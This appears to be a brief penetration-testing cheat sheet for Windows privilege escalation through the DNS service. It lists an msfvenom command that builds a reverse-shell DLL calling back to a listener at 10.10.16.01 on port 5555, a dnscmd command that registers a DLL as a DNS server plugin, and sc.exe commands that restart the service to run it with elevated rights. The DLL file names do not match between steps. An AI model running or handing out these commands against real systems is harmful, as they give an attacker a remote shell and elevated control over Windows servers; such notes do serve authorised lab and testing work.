Create a malicous dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.01 LPORT=5555 -f dll > dbs.dll

Load malicous dll into service. The path can be in smbshare too or really anywhere reachable
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Stop and start the service to execute binary under a higher permission context:
sc.exe stop dns
sc.exe start dns

